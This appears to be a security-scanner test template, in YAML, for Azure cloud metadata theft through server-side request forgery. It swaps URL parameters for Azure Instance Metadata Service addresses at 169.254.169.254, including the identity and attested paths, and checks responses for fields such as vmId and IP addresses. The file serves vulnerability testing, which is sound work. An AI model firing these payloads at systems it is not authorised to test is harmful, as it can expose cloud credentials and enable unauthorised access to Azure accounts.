id: SSRF_ON_AZURE_META_ENDPOINT
info:
  name: "Sensitive Azure details exposed due to SSRF"
  description: > 
    "The endpoint appears to be vulnerable to Server
    Side Request Forgery attack. The original request was replayed by replacing 
    the URI parameter with metadata endpoint provided by Azure. The application 
    responded with 2XX success code and also gave out sensitive Azure information in response."
  details: > 
    "The endpoint appears to be vulnerable to Server Side Request Forgery attack. 
    The original request was replayed by replacing the URI parameter with metadata 
    endpoint provided by Azure. The application responded with 2XX success code and 
    also gave out sensitive Azure information in response. Server-Side Request Forgery 
    (SSRF) flaws occur whenever an API is fetching a remote resource without validating 
    the user-supplied URL. It allows an attacker to coerce the application to send a 
    crafted request to an unexpected destination, even when protected by a firewall or a 
    VPN. Modern concepts in application development make SSRF more common and more dangerous. 
    More common - the following concepts encourage developers to access an external resource 
    based on user input: Webhooks, file fetching from URLs, custom SSO, and URL previews. 
    More dangerous - Modern technologies like cloud providers, Kubernetes, and Docker expose 
    management and control channels over HTTP on predictable, well-known paths. Those 
    channels are an easy target for an SSRF attack. It is also more challenging to limit 
    outbound traffic from your application, because of the connected nature of modern applications.
    The SSRF risk can not always be completely eliminated. While choosing a protection mechanism, 
    it is important to consider the business risks and needs."
  impact: >
    "Successful exploitation might compromise sensitive Azure information which attacker
    can use to get unauthorized access to Azure."
  category:
    name: SSRF
    shortName: Server Side Request Forgery
    displayName: Server Side Request Forgery (SSRF)
  subCategory: SSRF_ON_AZURE_META_ENDPOINT
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=windows
    - https://github.com/OWASP/API-Security/blob/master/2023/en/src/0xa6-server-side-request-forgery.md
    - https://www.akto.io/blog/how-to-prevent-server-side-request-forgery-ssrf-as-a-developer
  cwe:
    - CWE-918


api_selection_filters:
  response_code:
    gte: 200
    lt: 205
  or:
    - query_param:
        for_one:
          value:
            contains_either:
              - http
          key:
            extract: query_url_key
    - request_payload:
        for_one:
          value:
            contains_either:
              - http
          key:
            extract: body_url_key

wordLists:
  urls:
    - http://169.254.169.254/metadata/v1/maintenance
    - http://169.254.169.254/metadata/instance?api-version=2021-02-01
    - http://169.254.169.254/metadata/instance/compute?api-version=2021-01-01&format=json
    - http://169.254.169.254/metadata/attested
    - http://169.254.169.254/metadata/identity
    - http://169.254.169.254/metadata/loadbalancer
    - http://169.254.169.254/metadata/scheduledevents
    - http://169.254.169.254/metadata/versions
 
execute:
  type: single
  requests:
    - req:
      - modify_query_param:
          query_url_key: "${urls}"
      - modify_body_param:
          body_url_key: "${urls}"
validate:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    contains_either:
      - "vmId"
      - "securityProfile"
      - "publicIpAddress"
      - "privateIpAddress"
      - "azEnvironment"
